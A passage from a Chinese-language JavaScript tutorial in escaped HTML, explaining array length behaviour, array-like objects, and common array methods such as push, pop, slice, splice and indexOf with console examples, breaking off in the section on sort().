__proto__:Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个例子一开始是个空数组，长度是0，直接给他一个索引10，可以发现长度立马变为11。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr[100] = \u003cspan class=\"hljs-string\"\u003e'这次数组长度绝对是101'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"这次数组长度绝对是101\"\u003c/span\u003e\narr.length\n101\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过以上的例子，我们反向推理，把可以明白数组长度根本不连续，是动态变化的，即数组长度是可写的。唯一的不变真理是，它的长度永远等于最大索引+1。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2.1 把数组清空的方法\u003c/h4\u003e\n\u003cp\u003e有以上知识可以知道数组长度可以人为改变，进而大胆的猜想，改变长度会不会把数组清空呢？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arrDemo = [\u003cspan class=\"hljs-string\"\u003e'this'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'is'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'test'\u003c/span\u003e]\nundefined\narrDemo\n(3) [\u003cspan class=\"hljs-string\"\u003e\"this\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"is\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"test\"\u003c/span\u003e]\n    0: \u003cspan class=\"hljs-string\"\u003e\"this\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"is\"\u003c/span\u003e\n    2: \u003cspan class=\"hljs-string\"\u003e\"test\"\u003c/span\u003e\n    length: 3\n    __proto__: Array(0)\narrDemo[\u003cspan class=\"hljs-string\"\u003e'length'\u003c/span\u003e] = 2\n2\narrDemo\n(2) [\u003cspan class=\"hljs-string\"\u003e\"this\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"is\"\u003c/span\u003e]\n    0: \u003cspan class=\"hljs-string\"\u003e\"this\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"is\"\u003c/span\u003e\n    length: 2\n    __proto__: Array(0)\narrDemo[\u003cspan class=\"hljs-string\"\u003e'length'\u003c/span\u003e] = 1\n1\narrDemo\n[\u003cspan class=\"hljs-string\"\u003e\"this\"\u003c/span\u003e]\n    0: \u003cspan class=\"hljs-string\"\u003e\"this\"\u003c/span\u003e\n    length: 1\n    __proto__: Array(0)\narrDemo[\u003cspan class=\"hljs-string\"\u003e'length'\u003c/span\u003e] = 0\n0\narrDemo\n[]\n    length: 0\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e把数组length设为0，证明可以清空数组。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2.2 有趣的一点\u003c/h4\u003e\n\u003cp\u003e由于数组本质上是对象的一种，所以我们可以为数组添加属性，但是这不影响length属性的值。\n\u003cstrong\u003e一定不要有思维定式，以为添加几个新元素，长度就会加几个。\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = []\nundefined\narr\n[]\n    length:0\n    __proto__:Array(0)\narr[\u003cspan class=\"hljs-string\"\u003e'add'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'我加一个新元素，长度绝对还是0'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"我加一个新元素，长度绝对还是0\"\u003c/span\u003e\narr\n[add: \u003cspan class=\"hljs-string\"\u003e\"我加一个新元素，长度绝对还是0\"\u003c/span\u003e]\n    add: \u003cspan class=\"hljs-string\"\u003e\"我加一个新元素，长度绝对还是0\"\u003c/span\u003e\n    length:0\n    __proto__:Array(0)\narr[\u003cspan class=\"hljs-string\"\u003e'add1'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'我又加一个新元素，长度绝对还是0'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"我又加一个新元素，长度绝对还是0\"\u003c/span\u003e\narr\n[add: \u003cspan class=\"hljs-string\"\u003e\"我加一个新元素，长度绝对还是0\"\u003c/span\u003e, add1: \u003cspan class=\"hljs-string\"\u003e\"我又加一个新元素，长度绝对还是0\"\u003c/span\u003e]\n    add: \u003cspan class=\"hljs-string\"\u003e\"我加一个新元素，长度绝对还是0\"\u003c/span\u003e\n    add1: \u003cspan class=\"hljs-string\"\u003e\"我又加一个新元素，长度绝对还是0\"\u003c/span\u003e\n    length: 0\n    __proto__:Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过这个例子，一开始元素长度为0，只要你没添加一个正整数的索引，无论你添加多少其他元素，长度永远不会变化。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e注意：\u003cstrong\u003e方括号运算符里面一定要用引号，我总是手抖忘了加。\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e3. 伪数组(array-like object)\u003c/h3\u003e\n\u003cp\u003e如果一个对象的所有键名都是正整数或零，并且有length属性，那么这个对象就很像数组，语法上称为“类似数组的对象”\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar obj = {\n\u00090: \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e,\n\u00091: \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\n\u00092: \u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e,\n\u0009length: 3,\n}\nundefined\nobj\n{0: \u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, 1: \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e, 2: \u003cspan class=\"hljs-string\"\u003e\"c\"\u003c/span\u003e, length: 3}\n    0: \u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e\n    2: \u003cspan class=\"hljs-string\"\u003e\"c\"\u003c/span\u003e\n    length: 3\n    __proto__: Object\n\nobj[0]\n\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e\nobj[2]\n\u003cspan class=\"hljs-string\"\u003e\"c\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的对象，看着结构特别像但是绝对不是数组。\n因为__proto__指向的就不是Array的prototype，没有指向Array的共有属性，再怎么想也只是模仿，本质不同。不具备数组的其他方法（第四部分将要列举的方法）。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3.1 数组的本质\u003c/h4\u003e\n\u003cp\u003e由伪数组的问题引出真正的数组应该具备什么特点\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"数组.png\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bf7d0c3caea86?w=1240\u0026amp;h=526\u0026amp;f=png\u0026amp;s=25458\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n__proto__必须指向数组的公有属性才是真正的数组对象。\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4. 数组实例的常见简单的方法(可以无参或者参数很简单)\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e4.1 判断数组还是对象\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e]\nundefined\nArray.isArray(arr)\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\nvar obj = {\n\u00090: \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e,\n\u00091: \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\n\u00092: \u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e,\n\u0009length: 3,\n}\nundefined\nArray.isArray(obj)\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eArray.isArray()方法可以判断是不是数组对象，以前学过的instanceOf也可以判断。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr instanceof Array\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\nobj instanceof Array\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以现在有两个方法可以区分是数组还是对象了。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.2 valueOf()，toString()\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003evalueOf()返回数组本身\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e]\nundefined\narr.valueOf()\n(2) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e]\narr.toString()\n\u003cspan class=\"hljs-string\"\u003e\"a,b\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003etoString()返回数组的字符串形式\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e4.3 push()\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e]\nundefined\narr.push(\u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e)\n3\narr\n(3) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e向数组的末尾添加元素，返回添加成功后的数组的长度\n\u003cstrong\u003e会改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.4 pop()\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr.pop()\n\u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e\narr\n(2) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e]\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e删除数组的最后一个元素，并返回删除的这个元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[].pop() // undefined\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e注意：对空数组使用pop方法，不会报错，而是返回undefined。\n这个方法\u003cstrong\u003e会改变原数组\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003epush() 和pop()方法一起使用可以模拟栈的数据结构\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 class=\"heading\"\u003e4.5 join()\u003c/h4\u003e\n\u003cp\u003e以某种形式把数组的所有成员以\u003cstrong\u003e字符串的形式返回\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(2) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e]\narr.join(\u003cspan class=\"hljs-string\"\u003e'-'\u003c/span\u003e)\n\u003cspan class=\"hljs-string\"\u003e\"a-b\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上是以中划线的形式连接起来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr.join()\n\u003cspan class=\"hljs-string\"\u003e\"a,b\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果没有规定格式，则以逗号分隔\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'rr'\u003c/span\u003e, null, undefined]\nundefined\narr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\narr.join()\n\u003cspan class=\"hljs-string\"\u003e\"a,rr,,\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e注意：如果字符串中有null和undefined的，会被转成空字符串。\n\u003cstrong\u003e该方法不会改变原数组\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e4.6 concat()\u003c/h4\u003e\n\u003cp\u003e是一个专业合并数组的方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'rr'\u003c/span\u003e, null, undefined]\nundefined\narr.concat([\u003cspan class=\"hljs-string\"\u003e'rrr'\u003c/span\u003e])\n(5) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined, \u003cspan class=\"hljs-string\"\u003e\"rrr\"\u003c/span\u003e]\narr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e把一个新数组添加到旧数组的后面，返回生成的新数组。\n\u003cstrong\u003e不会改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.7 shift()\u003c/h4\u003e\n\u003cp\u003e删除数组的第一个元素,并返回删除的那个元素\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\narr.shift()\n\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e\narr\n(3) [\u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e会改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003epush()与shift()方法结合，可以模拟队列的数据结构\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 class=\"heading\"\u003e4.8 unshift()\u003c/h4\u003e\n\u003cp\u003e在数组的第一个位置添加元素，并返回添加新元素后的数组长度\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(3) [\u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\narr.unshift(\u003cspan class=\"hljs-string\"\u003e'ffff'\u003c/span\u003e)\n4\narr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e和shift()方法的作用正好相反。\n\u003cstrong\u003e一定会改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.9 reverse()\u003c/h4\u003e\n\u003cp\u003e反转数组，返回反转后的数组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, null, undefined]\narr.reverse()\n(4) [undefined, null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\narr\n(4) [undefined, null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e会改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.10 slice()\u003c/h4\u003e\n\u003cp\u003e提取原数组的一部分，返回一个新的数组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(4) [undefined, null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\narr.slice(1,3)\n(2) [null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e]\narr.slice()\n(4) [undefined, null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\narr.slice(1)\n(3) [null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\narr\n(4) [undefined, null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003earr.slice(1,3)从索引为1的位置开始截取，到索引3停止，但是不包括索引3。\narr.slice()无参是原数组的拷贝\narr.slice(1)从索引为1的位置开始截取，到末尾。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e];\na.slice(-2) // [\u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"c\"\u003c/span\u003e]\na.slice(-2, -1) // [\u003cspan class=\"hljs-string\"\u003e\"b\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果slice方法的参数是负数，则表示倒数计算的位置。\n上面代码中，-2表示倒数计算的第二个位置，-1表示倒数计算的第一个位置。\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eslice()方法可以吧伪数组变成真的数组\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003e不会改变原数组\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.11 splice()\u003c/h4\u003e\n\u003cp\u003e删除原数组的一部分成员，返回被删的元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr\n(4) [undefined, null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\narr.splice(1, 3)\n(3) [null, \u003cspan class=\"hljs-string\"\u003e\"rr\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ffff\"\u003c/span\u003e]\narr\n[undefined]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003earr.splice(1,3)，从索引1开始删除，删3个元素！！！\n一定要注意和slice区分：splice的第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'aaa'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ff'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'aff'\u003c/span\u003e, 1]\nundefined\narr.splice(1, 3, \u003cspan class=\"hljs-string\"\u003e'wu'\u003c/span\u003e, 999)\n(3) [\u003cspan class=\"hljs-string\"\u003e\"aaa\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ff\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"aff\"\u003c/span\u003e]\narr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"wu\"\u003c/span\u003e, 999, 1]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003earr.splice(1, 3, 'wu', 999)，从索引1开始删了3个元素，有加上两个元素，'wu'和999\n同样的负数表示倒数第几个位置\n\u003cstrong\u003e会改变原数组\u003c/strong\u003e\nsplice()有两个变式\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e变式1:我只是想单纯的插入一个元素\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = [1, 1, 1];\na.splice(1, 0, 2) // []\na // [1, 2, 1, 1]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e把第二个参数设为0,就可以在第2个位置插入一个元素了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e变式2:我只给一个参数，就是拆分数组，为两个新数组\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ea\n(5) [1, 1, 1111, 1, 10]\na.splice(2)\n(3) [1111, 1, 10]\na\n(2) [1, 1]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ea.splice(2)从第三个索引处拆分这个数组。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.12 indexOf()，lastIndexOf()\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e, 1]\nundefined\narr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e, 1]\n    0: \u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e\n    2: \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e\n    3: 1\n    length: 4\n    __proto__: Array(0)\narr.indexOf(1)\n3\narr.indexOf(\u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e, 3)\n-1\narr.lastIndexOf(\u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e)\n2\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eindexOf()，返回括号里面 的元素第一次出现的位置。\n如果有两个参数则是表示搜索的位置从第二个参数开始。\n如果找不到该元素，则返回-1。\nlastIndexOf()返回括号里面的元素最后一次出现的位置。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e一个MDN的实战例子：获得数组里面某个元素出现的所有位置(利用循环和返回值-1的特点)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, 0, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e];\nvar arrTemp = []; //空数组用来存储目标元素出现的所有索引\nvar element = \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e;\nvar index = arr.indexOf(element);\n\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e(index != -1){\n\u0009arrTemp.push(index);\n\u0009index = arr.indexOf(element, index + 1);\n}\nconsole.log(arrTemp);\n(3) [0, 2, 4] //\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e出现在0、2、4索引位置处\n\u003c/code\u003e\u003c/pre\u003e\u003chr\u003e\n\u003cp\u003e注意：这里有个例外\n数组里面包含NaN时无法判断\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'f'\u003c/span\u003e, NaN]\nundefined\narr\n(4) [\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e, NaN]\n    0: \u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e\n    2: \u003cspan class=\"hljs-string\"\u003e\"f\"\u003c/span\u003e\n    3: NaN\n    length: 4\n    __proto__: Array(0)\narr.indexOf(NaN)\n-1\narr.lastIndexOf(\u003cspan class=\"hljs-string\"\u003e'NaN'\u003c/span\u003e)\n-1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003earr数组的第四个位置是NaN,但是无法获得索引。\n\u003cstrong\u003e因为indexOf()，lastIndexOf()是严格按照\u003ccode\u003e===\u003c/code\u003e操作符来检测的，而NaN是唯一的不与自身相等的值。\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eNaN === NaN\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n1 === 1\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e === \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e\n\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e奇葩啊，NaN与自己都不相等\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e5. 数组实例的常见复杂的方法(参数是另一个函数)\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e5.1 sort()\u003c/h4\u003e\n\u003cp\u003e下面MDN的解释非常棒\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esort()\u003c/code\u003e\u0026nbsp;方法在适当的位置对数组的元素进行排序，并返回数组。 sort 排序不一定是\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95#.E7.A9.A9.E5.AE.9A.E6.80.A7\"\u003e稳定的\u003c/a\u003e。默认排序顺序是根据字符串Unicode码点。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar fruit = [\u003cspan class=\"hljs-string\"\u003e'cherries'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'apples'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'bananas'\u003c/span\u003e];\nfruit.sort(); \n// [\u003cspan class=\"hljs-string\"\u003e'apples'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'bananas'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'cherries'\u003c/span\u003e]\n\nvar scores = [1, 10, 21, 2]; \nscores.sort(); \n// [1, 10, 2, 21]\n// 注意10在2之前,\n// 因为在 Unicode 指针顺序中\u003cspan class=\"hljs-string\"\u003e\"10\"\u003c/span\u003e在\u003cspan class=\"hljs-string\"\u003e\"2\"\u003c/span\u003e之前\n\nvar things = [\u003cspan class=\"hljs-string\"\u003e'word'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Word'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'1 Word'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'2 Words'\u003c/span\u003e];\nthings.sort(); \n// [\u003cspan class=\"hljs-string\"\u003e'1 Word'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'2 Words'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'Word'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'word'\u003c/span\u003e]\n// 在Unicode中, 数字在大写字母之前,\n// 大写字母在小写字母之前.\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上述代码两点注意\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e第一点是\n上述代码中的第二部分的\u003ccode\u003e[1, 10, 2, 21]\u003c/code\u003e是因为\n\u003ccode\u003e10\u003c/code\u003e的Unicode编码是\\u0031\\u0030，\u003ccode\u003e2\u003c/code\u003e的Unicode编码是\\u0032，所以\u003ccode\u003e10\u003c/code\u003e排在\u003ccode\u003e2\u003c/code\u003e的前面\u003c/li\u003e\n\u003cli\u003e第二点是上述代码中的第三部分的\u003ccode\u003e['1 Word', '2 Words', 'Word', 